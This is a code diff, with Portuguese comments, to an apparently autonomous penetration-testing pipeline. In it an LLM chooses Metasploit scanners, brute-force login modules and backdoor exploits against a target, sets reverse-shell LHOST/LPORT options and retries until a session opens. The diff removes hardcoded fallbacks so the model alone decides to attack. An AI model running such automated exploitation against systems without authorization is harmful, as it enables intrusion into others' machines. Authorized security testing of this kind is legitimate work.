@@ -19,7 +19,7 @@ from src.metasploit_client import MetasploitClient
 from src.llm_client import LLMClient
 from src.rag_engine import RagEngine
 from src.pipeline_common import PipelineBase, resolve_target
-from src import recon, wordlists, attack_policy
+from src import recon, wordlists
 
 # --- COLORS ---
 C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
@@ -112,57 +112,6 @@ class PentestPipeline(PipelineBase):
                 s.close()
                 return "No Banner"
         except: return "No Banner"
-
-    # --- SMART RESOLVER ---
-    def resolve_module_name(self, bad_name):
-        print(f"{C_YELLOW}[AUTONOMY] Buscando correcao para '{bad_name}'...{C_RESET}")
-        
-        search_terms = []
-        base_name = bad_name.replace("auxiliary", "").replace("scanner", "").replace("exploit", "").strip("/")
-        
-        if "/" in base_name:
-            search_terms.append(base_name.split("/")[-1])
-        else:
-            search_terms.append(base_name)
-
-        for proto in ['ftp', 'ssh', 'http', 'smb', 'mysql', 'postgres', 'telnet', 'smtp', 'irc', 'java', 'vnc', 'rdp']:
-            if proto in base_name:
-                search_terms.append(proto)
-
-        for term in search_terms:
-            try:
-                res = self.msf.client.call('module.search', [term])
-                if not res: continue
-                
-                candidates = []
-                for mod in res:
-                    m_name = mod.get('fullname')
-                    if term not in m_name: continue
-                    if "auxiliary/scanner" in m_name:
-                        candidates.append(m_name)
-                    elif "exploit" in m_name and "exploit" in bad_name:
-                        candidates.append(m_name)
-
-                if candidates:
-                    if "version" in bad_name:
-                        vers = [c for c in candidates if "version" in c]
-                        if vers: return vers[0]
-                    
-                    if "login" in bad_name:
-                        logs = [c for c in candidates if "login" in c]
-                        if logs: return logs[0]
-                    
-                    if "backdoor" in bad_name:
-                        bds = [c for c in candidates if "backdoor" in c]
-                        if bds: return bds[0]
-
-                    candidates.sort(key=len)
-                    print(f"{C_GREEN}[FIX] Substituindo por: {candidates[0]}{C_RESET}")
-                    return candidates[0]
-            except: pass
-            
-        # BLOQUEIO DE SEGURANÇA CONTRA ALUCINAÇÕES
-        return None
 
     # --- RELATORIO ---
     def generate_text_report(self):
@@ -269,7 +218,7 @@ class PentestPipeline(PipelineBase):
             3. Use EXPLOITS only when there is a STRONG MATCH between service, product, and version.
             4. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
                - If the exploit requires a Reverse Shell, include "LHOST": "{self.attacker_ip}" and an "LPORT" (e.g., "4444").
-               - If it is a Bind Shell or does not need a reverse connection (like vsftpd backdoor), OMIT LHOST and LPORT.
+               - If it is a Bind Shell or does not require a reverse connection, OMIT LHOST and LPORT.
                - For exploits, usually set "DisablePayloadHandler": "false".
                - Do NOT include USERNAME or PASSWORD in the options for brute force modules, the script handles that.
             5. Use EXPLOITS only when there is a STRONG MATCH between:
@@ -290,9 +239,9 @@ class PentestPipeline(PipelineBase):
             3. Recommend ONE Metasploit module that best fits the evidence.
             4. Justify your decision using ONLY technical reasoning.
             5. Select Strategy:
-               - "brute_force": ONLY if is a login scanners (ssh_login, ftp_login, etc) and NOT a backdoor.
+               - "brute_force": for authentication services, using an authentication login scanner (never for a backdoor/exploit).
                - "enumeration": ONLY for version scanners or simple checks (NO credentials used).
-               - "exploit_cve": If the banner contains FAMOUS BACKDOORS (e.g. 'vsFTPd 2.3.4', 'UnrealIRCd 3.2.8.1', 'DistCC') ATTACK IMMEDIATELY.
+               - "exploit_cve": when product and version strongly match a known vulnerability or backdoor (reason from the banner and the RAG knowledge; do not rely on hardcoded examples).
                - "skip": If unknown
                
                
@@ -330,14 +279,12 @@ class PentestPipeline(PipelineBase):
             
             if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")
 
-            info = getattr(self, "services", {}).get(port, {"banner": banner})
-            pol = attack_policy.decide(info, wordlist_available=True)
-            if (not module) or strategy == "skip":
-                if pol["module_name"]:
-                    strategy = pol["strategy"]
-                    module = pol["module_name"]
-                    print(f"{C_YELLOW}[POLICY] {strategy.upper()} -> {module} ({pol['reason']}){C_RESET}")
+            if not resp:
+                print(f"{C_RED}[LLM] Modelo indisponivel apos retries: sem decisao para a porta {port}. "
+                      f"Pulando (sem fallback hardcoded).{C_RESET}")
+                continue
             if strategy == "skip" or not module:
+                print(f"{C_YELLOW}[AI] O modelo decidiu nao atacar a porta {port}.{C_RESET}")
                 continue
 
             if "login" in module or "credential" in module: strategy = "brute_force"
@@ -353,12 +300,27 @@ class PentestPipeline(PipelineBase):
             # 2. Verifica se o modulo existe
             if not self.msf.verify_module_exists("auxiliary", clean_name) and \
                not self.msf.verify_module_exists("exploit", clean_name):
-                fixed = self.resolve_module_name(clean_name)
-                if fixed: 
+                # Autocorrecao AUTONOMA: o erro volta ao LLM para ele re-decidir
+                # (sem heuristica hardcoded de substituicao de modulo).
+                fix_prompt = (f"O modulo Metasploit '{module}' nao existe nesta instalacao.\n"
+                              f"Servico/banner: {banner}\nContexto (RAG):\n{rag_context}\n"
+                              f"Responda SOMENTE JSON com um modulo Metasploit REAL e valido: "
+                              f'{{"module_type":"auxiliary|exploit","module_name":"cat/serv/mod","strategy":"enumeration|brute_force|exploit_cve"}}')
+                fresp = self.ask_llm_robust(fix_prompt)
+                fixed = ""
+                if fresp:
+                    try:
+                        if "{" in fresp: fresp = fresp[fresp.find("{"):fresp.rfind("}")+1]
+                        fp = json.loads(fresp)
+                        fixed = (fp.get("module_name") or "").strip()
+                        if fp.get("strategy"): strategy = fp["strategy"].lower()
+                    except Exception: pass
+                if fixed:
+                    module = fixed
                     clean_name = fixed.replace("exploit/", "").replace("auxiliary/", "").strip("/")
-                    if "login" in fixed: strategy = "brute_force"
-                else:
-                    print(f"{C_RED}[ERRO] Modulo '{clean_name}' invalido ou inexistente.{C_RESET}")
+                if not (self.msf.verify_module_exists("auxiliary", clean_name) or
+                        self.msf.verify_module_exists("exploit", clean_name)):
+                    print(f"{C_RED}[ERRO] Modulo invalido e o LLM nao forneceu alternativa valida. Pulando.{C_RESET}")
                     continue
 
             # 3. Define o tipo cravado baseado na estrategia da IA
@@ -427,7 +389,8 @@ class PentestPipeline(PipelineBase):
                         if sid != self.session_id:
                             print(f"{C_GREEN}[***] SUCESSO ABSOLUTO! Exploit funcionou (Sessao {sid}){C_RESET}")
                             self.session_id = sid
-                            break # SESSÃO OBTIDA
+                            self.history.append(f"[SUCESSO] Porta {port} via {m_type}/{m_name} (sessao {sid})")
+                            break # SESSAO OBTIDA
                     
                     print(f"{C_RED}[FALHA] Nenhuma sessao obtida na tentativa {attempt}.{C_RESET}")
                     
